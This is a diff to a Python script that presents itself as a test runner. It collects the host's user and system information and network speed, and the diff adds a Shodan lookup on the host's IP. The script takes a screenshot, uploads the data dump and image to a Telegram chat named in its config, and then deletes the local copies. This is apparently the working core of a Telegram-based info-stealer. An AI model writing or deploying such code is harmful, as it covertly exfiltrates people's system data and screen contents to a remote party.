@@ -1,8 +1,8 @@
 from datetime import datetime
-import telebot
+from telebot import TeleBot
 import json
 from itertools import chain
-from Tests import Networking, Screenshot, UserInfoTest
+from Tests import Networking, Screenshot, UserInfoTest, ShodanTests
 import time
 import threading
 from os import remove
@@ -10,7 +10,7 @@ import sys
 
 # config settings
 config = json.load(open("config.json"))
-bot = telebot.TeleBot(config['token'], parse_mode="Markdown")
+bot = TeleBot(config['token'], parse_mode="Markdown")
 botTasks = {key: val for key, val in zip(config['tasks'], [' '] * len(config['tasks']))}
 starts = datetime.now()
 
@@ -39,30 +39,33 @@ def testRunner(beginTimer):
     frontendThread.start()
     
     client = UserInfoTest.getUserInfo()
-    botTasks['Get user data'] = 'x'
+    botTasks['Getting user data'] = 'x'
     network = Networking.calculateNetworkSpeedTest()
-    botTasks['Test network speed'] = 'x'
+    botTasks['Testing network speed'] = 'x'
+    client.update(ShodanTests.requestDomainInformation(client['ip']))
     
     results = {
         "network information": network,
         "system information": client
     }
+    botTasks['Running shodan tests'] = 'x'
+    
     open("dumps.json", 'w').write(json.dumps(results, indent=4))
     bot.send_document(chat_id=config['userSession'], data=open("dumps.json", 'rb'))
     remove("dumps.json")
     try:
         Screenshot.makeScreenshot()
         bot.send_photo(chat_id=config['userSession'], photo=open('image1.png', 'rb'))
-        botTasks['Take screenshot'] = 'x'
+        botTasks['Taking screenshot'] = 'x'
         remove("image1.png")
     except Exception:
         bot.send_message(chat_id=config['userSession'], text="Attempt to make screenshot *failed*")
-    
     
     ends = datetime.now()
     workSpeedTest = ends - starts
     bot.send_message(chat_id=config['userSession'], text="``` It took {} to complete task ```".format(str(workSpeedTest)[:-7]))
     sys.exit("My work is done!")
+
 
 if __name__ == "__main__":
     testRunner(datetime.now())
